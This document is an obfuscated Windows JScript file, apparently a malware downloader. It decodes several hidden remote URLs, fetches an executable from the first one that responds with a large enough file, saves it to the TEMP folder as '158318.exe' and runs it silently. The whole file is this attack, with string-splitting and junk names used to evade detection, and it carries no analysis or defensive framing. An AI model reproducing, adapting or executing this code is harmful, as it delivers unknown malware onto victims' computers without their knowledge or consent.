
function zYaBAStoq(cIbQoyNtqOj) {
var MjhwvmRX = "cxum Ws StQwzYl cri pt.S XVvkig hell".split(" ");
var VslxJsFv = WScript.CreateObject(MjhwvmRX[1] + MjhwvmRX[3] + MjhwvmRX[4] + MjhwvmRX[6]);
VslxJsFv.Run(cIbQoyNtqOj, 0x1, 0x0);
}
function RXZxOUVkB(TAfJQ,qkKmJ,dFdmq,pfLB) {
var ITQye = "gcDFUJ gjf pt.Shell ZnCUclU Scri  %TE MP% \\".split(" ");
var hWs=((1)?"W" + ITQye[4]:"")+ITQye[2];
var oV = WScript.CreateObject(hWs);
return oV.ExpandEnvironmentStrings(ITQye[6]+ITQye[7]+ITQye[8]);
}
function CiwmvnEV() {
var TUsaMHR = "Sc gbWURzd r qjsjneGFr ipting wcCkRun Pjy ile pUWUqLBDHDLfmO System wa lBVPE Obj AHcwOP ect qYsWedp".split(" ");
return TUsaMHR[0] + TUsaMHR[2] + TUsaMHR[4] + ".F" + TUsaMHR[7] + TUsaMHR[9] + TUsaMHR[12] + TUsaMHR[14];
}
function jjWx(kQvGP) {
OSvwNBM = WScript.CreateObject(kQvGP);
return OSvwNBM
}
function HRIg(SfhDx,Ksnsf) {
SfhDx.write(Ksnsf);
}
function FwUM(hyiNm) {
hyiNm.open();
}
function CWRK(GaYPu,cgfdh) {
GaYPu.saveToFile(cgfdh,511-509);
}
function NIeS(SnlTN,MVApe,hIESd) {
SnlTN.open(hIESd,MVApe,false);
}
function JSkp(XINvh) {
if (XINvh == 301-101){return true;} else {return false;}
}
function nwsB(RWuWV) {
if (RWuWV > 195212-856){return true;} else {return false;}
}
function ImIs(RgqrD) {
var nGRRC="";
i=(393-393);
while(true) {
if (i >= RgqrD.length) {break;}
if (i % (377-375) != (559-559)) {
nGRRC += RgqrD.substring(i, i+(432-431));
}
i++;
}
return nGRRC;
}
function NRmg(zRNgQ) {
var bbeousnu=["\x73\x65\x6E\x64"];
zRNgQ[bbeousnu[0]]();
}
function gTov(EdxEF) {
return EdxEF.status;
}
function etQyw(uMmOSP) {
return new ActiveXObject(uMmOSP);
}
function kslKlxR(agpA) {
return agpA.responseBody;
}
function EHLgppkN(POl) {
return POl.size;
}
var Iz="jg4rKeCeqtCiTnWgjsOjvaOmca5jScdajfkfv.ocqoBmf/o810oJgkaKyC8?U khpe4l5liofmJiIsstEeBrmbdihzdnueuseqIqy.fc8oZmj/N820bJtkiKSC7?W T?f y?r 7?";
var al = ImIs(Iz).split(" ");
var KsDsWg = ". vHKKKE e YerlRWWw xe JkKC".split(" ");
var y = [al[0].replace(new RegExp(KsDsWg[5],'g'), KsDsWg[0]+KsDsWg[2]+KsDsWg[4]),al[1].replace(new RegExp(KsDsWg[5],'g'), KsDsWg[0]+KsDsWg[2]+KsDsWg[4]),al[2].replace(new RegExp(KsDsWg[5],'g'), KsDsWg[0]+KsDsWg[2]+KsDsWg[4]),al[3].replace(new RegExp(KsDsWg[5],'g'), KsDsWg[0]+KsDsWg[2]+KsDsWg[4]),al[4].replace(new RegExp(KsDsWg[5],'g'), KsDsWg[0]+KsDsWg[2]+KsDsWg[4])];
var ARe = RXZxOUVkB("kTtd","FfgGz","bbaXue","UsjPmcB");
var JiL = etQyw(CiwmvnEV());
var XWbGUY = ("iHbrJFY \\").split(" ");
var RLaG = ARe+XWbGUY[0]+XWbGUY[1];
try{
JiL.CreateFolder(RLaG);
}catch(rtHMhe){
};
var BJy = ("2.XMLHTTP jLxApqY KqiVh XML ream St mwKgkhqY AD HDixbiq O tucu D").split(" ");
var UG = true  , XLJR = BJy[7] + BJy[9] + BJy[11];
var Dw = jjWx("MS"+BJy[3]+(771837, BJy[0]));
var kAc = jjWx(XLJR + "B." + BJy[5]+(953165, BJy[4]));
var JWV = 0;
var v = 1;
var HtNRleM = 158318;
var C=JWV;
while (true)  {
if(C>=y.length) {break;}
var Fl = 0;
var jKT = ("ht" + " EuswkEO tp vxtKi GWQsNycd :// FvEMlMH .e xe G ET").split(" ");
try  {
var tEiwx=jKT[708-708]+jKT[341-339]+jKT[338-333];
NIeS(Dw,tEiwx+y[C]+v, jKT[9]+jKT[10]); NRmg(Dw); if (JSkp(gTov(Dw)))  {      
FwUM(kAc); kAc.type = 1; HRIg(kAc,kslKlxR(Dw)); if (nwsB(EHLgppkN(kAc)))  {
Fl = 1;kAc.position=0;CWRK(kAc,/*cUZf66eZc5*/RLaG/*LrH538vpp3*/+HtNRleM+jKT[7]+jKT[8]); try  {
if (((new Date())>0,7754181888)) {
zYaBAStoq(RLaG+HtNRleM+/*GDFi89SuP8*/jKT[7]+jKT[8]/*gRVs94qCVF*/); 
break;
}
}
catch (eC)  {
}; 
}; kAc.close(); 
}; 
if (Fl == 1)  {
JWV = C; break; 
}; 
}
catch (eC)  { 
}; 
C++;
}; 

